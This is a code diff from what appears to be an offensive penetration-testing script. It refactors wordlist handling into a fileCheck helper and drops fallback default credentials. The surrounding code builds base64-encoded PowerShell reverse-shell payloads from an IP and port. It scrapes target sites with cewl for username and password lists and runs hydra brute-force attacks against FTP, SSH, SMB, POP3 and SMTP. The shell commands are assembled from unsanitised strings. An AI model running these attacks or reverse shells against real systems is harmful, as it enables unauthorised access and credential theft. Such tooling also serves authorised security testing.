@@ -308,6 +308,15 @@ def powershell(ip, port):
    rev = revPlain.replace("SUPERIPA" , ip).replace("PORT", port)
    payload = base64.b64encode(rev.encode('UTF-16LE')).decode()
    return payload
+   
+def fileCheck(variable):
+   if os.path.exists("/usr/share/ncrack/minimal.usr"):
+      print("[+] Adding mimimal userlist to file ...")
+      command("cat /usr/share/ncrack/minimal.usr >> " + variable + " 2>&1")
+      command("sed -i '/#/d' " + variable + " 2>&1")
+      command("sed -i '/Email addresses found/d' " + variable + " 2>&1")
+      command("sed -i '/---------------------/d' " + variable + " 2>&1")
+   return
 
 def display():
    print('\u2554' + ('\u2550')*14 + '\u2566' + ('\u2550')*42 + '\u2566' + ('\u2550')*46 + '\u2566' + ('\u2550')*58 + '\u2557')
@@ -2862,12 +2871,8 @@ while True:
          else:
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
             print("[+] User list generated via ip address...")
-            
-         if os.path.exists("/usr/share/ncrack/minimal.usr"):
-            command("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/usernames.txt 2>&1")
-            command("sed -i '/#/d' " + dataDir + "/usernames.txt 2>&1")
-            command("sed -i '/Email addresses found/d' " + dataDir + "/usernames.txt 2>&1")
-            command("sed -i '/---------------------/d' " + dataDir + "/usernames.txt 2>&1")
+         
+         fileCheck(dataDir + "/usernames.txt")
 
          for x in range (0,maxUser):
             USER[x] = linecache.getline(dataDir + "/usernames.txt", x+1).rstrip(" ")
@@ -2893,13 +2898,9 @@ while True:
          else:
             command("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/passwords.txt " + TIP.rstrip(" ") + " 2>&1")
             print("[+] Password list generated via ip address...")
-
-         if os.path.exists("/usr/share/ncrack/minimal.usr"):
-            print("[+] Adding NCrack minimal.usr list as well...")
-            command("cat /usr/share/ncrack/minimal.usr >> " + dataDir + "/passwords.txt 2>&1")
-            command("sed -i '/#/d' " + dataDir + "/passwords.txt 2>&1")
-            command("sed -i '/Email addresses found/d' " + dataDir + "/passwords.txt 2>&1")
-            command("sed -i '/---------------------/d' " + dataDir + "/passwords.txt 2>&1")
+            
+         fileCheck(dataDir + "/passwords.txt")
+         
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -3089,25 +3090,8 @@ while True:
          checkParams = testFour("21")
       
       if checkParams != 1:
-         if os.path.getsize(dataDir + "/usernames.txt") == 0:
-            print("[-] Username file is empty...")
-            
-            if USER[:1] != "'":
-               print("[+] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-            else:
-               print("[+] Adding user 'Administrator'...")
-               command("echo 'Administrator' >> " + dataDir + "/usernames.txt")         
-               
-         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
-            print("[-] Password file is empty...")
-            
-            if HASH[:1] != "'":
-               print("[+] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> " + dataDir + "/passwords.txt")
-            else:
-               print("[+] Adding password 'password'...")
-               command("echo password >> " + dataDir + "/passwords.txt")         
+         fileCheck(dataDir + "/usernames.txt")  
+         fileCheck(dataDir + "/passwords.txt")      
                
          command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt ftp://" + TIP.rstrip(" "))
             
@@ -3133,25 +3117,9 @@ while True:
          checkParams = testFour("22") 
       
       if checkParams != 1:
-         if os.path.getsize(dataDir + "/usernames.txt") == 0:
-            print("[-] Username file is empty...")
-      
-            if USER[:1] != "'":
-               print("[+] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-            else:
-               print("[+] Adding user 'administrator'...")
-               command("echo 'administrator' >> " + dataDir + "/usernames.txt")         
-               
-         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
-            print("[-] Password file is empty...")
-            if HASH[:1] != "'":
-               print("[+] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> " + dataDir + "/passwords.txt")
-            else:
-               print("[_] Adding password 'Summer2020'...")
-               command("echo Summer2020 >> " + dataDir + "/passwords.txt")         
-               
+         fileCheck(dataDir + "/usernames.txt")
+         fileCheck(dataDir + "/passwords.txt")  
+         
          command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt ssh://" + TIP.rstrip(" "))
             
          for x in range (0,maxUser):
@@ -3188,26 +3156,9 @@ while True:
          checkParams = testFour("445")     
       
       if checkParams != 1:
-         if os.path.getsize(dataDir + "/usernames.txt") == 0:
-            print("[-] Username file is empty...")
-      
-            if USER[:1] != "'":
-               print("[+] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-            else:
-               print("[+] Adding user 'Administrator'...")
-               command("echo 'Administrator' >> " + dataDir + "/usernames.txt")         
-               
-         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
-            print("[-] Password file is empty...")
-            
-            if HASH[:1] != "'":
-               print("[+] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> " + dataDir + "/passwords.txt")
-            else:
-               print("[+] Adding password 'Summer2020'...")
-               command("echo Summer2020 >> " + dataDir + "/passwords.txt")
-               
+         fileCheck(dataDir + "/usernames.txt")
+         fileCheck(dataDir + "/passwords.txt")  
+                        
          command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt smb://" + TIP.rstrip(" "))
             
          for x in range (0,maxUser):
@@ -3232,26 +3183,9 @@ while True:
          checkParams = testFour("110")
       
       if checkParams != 1:
-         if os.path.getsize(dataDir + "/usernames.txt") == 0:
-            print("[-] The username file is empty...")
-           
-            if USER[:2] != "''":
-               print("[+] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-            else:
-               print("[+] Adding user 'Administrator'...")
-               command("echo 'Administrator' >> " + dataDir + "/usernames.txt")
-               
-         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
-            print("[-] Password file is empty...")
-            
-            if HASH[:2] != "''":
-               print("[+] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> " + dataDir + "/passwords.txt")
-            else:
-               print("[+] Adding password 'Summer2020'...")
-               command("echo Summer2020 >> " + dataDir + "/passwords.txt")
-               
+         fileCheck(dataDir + "/usernames.txt")
+         fileCheck(dataDir + "/passwords.txt")  
+                        
          command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " pop3")
          
          for x in range (0,maxUser):
@@ -3276,26 +3210,9 @@ while True:
          checkParams = testFour("25")
       
       if checkParams != 1:
-         if os.path.getsize(dataDir + "/usernames.txt") == 0:
-            print("[-] The username file is empty...")
-           
-            if USER[:2] != "''":
-               print("[+] Adding user '" + USR.rstrip(" ") + "'...")
-               command("echo " + USR.rstrip(" ") + " >> " + dataDir + "/usernames.txt")
-            else:
-               print("[+] Adding user 'Administrator'...")
-               command("echo 'Administrator' >> " + dataDir + "/usernames.txt")
-               
-         if os.path.getsize(dataDir + "/passwords.txt") == 0:             
-            print("[-] Password file is empty...")
-            
-            if HASH[:2] != "''":
-               print("[+] Adding password '" + PAS.rstrip(" ") + "'...")
-               command("echo '" + PAS.rstrip(" ") + "' >> " + dataDir + "/passwords.txt")
-            else:
-               print("[+] Adding password 'Summer2020'...")
-               command("echo Summer2020 >> " + dataDir + "/passwords.txt")
-               
+         fileCheck(dataDir + "/usernames.txt")
+         fileCheck(dataDir + "/passwords.txt")  
+                        
          command("hydra -P " + dataDir + "/passwords.txt -L " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " smtp")
          
          for x in range (0,maxUser):
